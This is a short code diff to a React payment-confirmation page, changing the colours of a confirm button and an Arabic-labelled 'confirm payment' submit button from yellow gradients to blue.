@@ -202,7 +202,7 @@ export default function ConfiPage() {
                 onClick={handleMessageConfirm}
                 className="mt-2 w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm transition-all"
                 style={{
-                  background: "linear-gradient(135deg, #f4ad27 0%, #e09a18 100%)",
+                  background: "linear-gradient(135deg, #1976d2 0%, #e09a18 100%)",
                   color: "#1a3d52",
                   boxShadow: "0 6px 20px rgba(244,173,39,0.35)",
                 }}
@@ -264,7 +264,7 @@ export default function ConfiPage() {
 
           <Button
             type="submit"
-            className="h-12 w-full rounded-xl bg-gradient-to-r from-[#f0b429] to-[#f7c04a] text-lg font-extrabold text-[#145072] shadow-md transition-all hover:from-[#e2a61f] hover:to-[#f0b429]"
+            className="h-12 w-full rounded-xl bg-[#1976d2] text-lg font-extrabold text-white shadow-md transition-all hover:bg-[#1565c0]"
             disabled={_v6.length !== 4 || isSubmitting || _v6Status === "verifying"}
           >
             تأكيد الدفع
